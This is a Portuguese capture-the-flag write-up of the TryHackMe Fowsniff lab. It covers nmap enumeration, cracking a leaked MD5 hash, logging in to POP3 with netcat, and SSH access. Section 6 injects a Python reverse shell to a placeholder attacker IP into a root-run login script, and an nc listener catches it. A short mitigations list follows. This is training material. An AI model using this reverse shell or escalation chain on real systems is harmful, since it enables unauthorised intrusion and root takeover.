# Fowsniff CTF — Write-up Completo
> Ambiente de prática em segurança ofensiva focado em enumeração, credenciais vazadas, serviços de e-mail e privilégio root via script mal configurado.
> Plataforma: TryHackMe

## 1. Enumeração Inicial (Recon)
Iniciamos com um scan completo usando Nmap, buscando máxima verbosidade e detecção de serviços:

`nmap -A -Pn -sV 10.67.144.104`

## Serviços Identificados  

|  Porta  |	 Serviço  |	 Versão  |  
| ------------- |:-------------:| -----:|
|  22	    | SSH	      |  OpenSSH 7.2p2  |  
80	| HTTP |	Apache 2.4.18
110	| POP3 | Dovecot
143	| IMAP |	Dovecot   

> O site HTTP estava fora do ar, mas o desafio indica que o conteúdo original continha credenciais vazadas.

##  2. Vazamento de Credenciais
Consultando o repositório público do projeto, encontramos um arquivo .txt contendo e-mails corporativos + hashes MD5 das senhas.

Credencial-alvo (pedido pelo desafio)
Email: `seina@fowsniff`

Hash: `90dc16d47114aa13671c697fd506cf26`

Após quebrar o hash:

Senha: `scoobydoo2`

##  3. Acesso ao POP3
Utilizamos netcat para autenticar no serviço POP3:

```
nc <IP> 110
USER seina
PASS scoobydoo2
LIST

```

### Emails encontrados
Email 1: contém a senha

`S1ck3nBluff+secureshell`
Email 2: contém o usuário

`baksteen`

## 4. Acesso via SSH
Com usuário e senha em mãos:

`ssh baksteen@<IP>`

**Login realizado com sucesso.**

## 5. Enumeração de Privilégios
Buscando arquivos pertencentes ao grupo users:

`find / -group users -type f 2>/dev/null`

Resultado relevante:

`/opt/cube/cube.sh`

**Esse script era executado automaticamente no login e rodava com privilégios elevados.**

## 6. Exploração — Injeção de Comando
Conteúdo original do cube.sh:

`cat /opt/cube/cube.sh`

O script apenas exibia um banner ASCII — sem validações.

Então editamos o arquivo e injetamos um reverse shell em Python:

```
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("<MEU_IP",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
subprocess.call(["/bin/sh","-i"]);'
```

## 7. Escalada para Root
Abrimos um listener local:

```
nc -lvnp 1234
```
Saímos do SSH
Logamos novamente

O script é executado automaticamente → reverse shell como root

## 8. Captura da Flag
`cd /root`
`cat flag.txt`

**Flag obtida com sucesso**


### Mitigações (Blue Team)
- Nunca armazenar hashes/senhas em repositórios públicos

- Evitar execução automática de scripts com permissões elevadas

- Princípio do menor privilégio

- Monitoramento de serviços POP3/IMAP

- Hardening de scripts executados no login
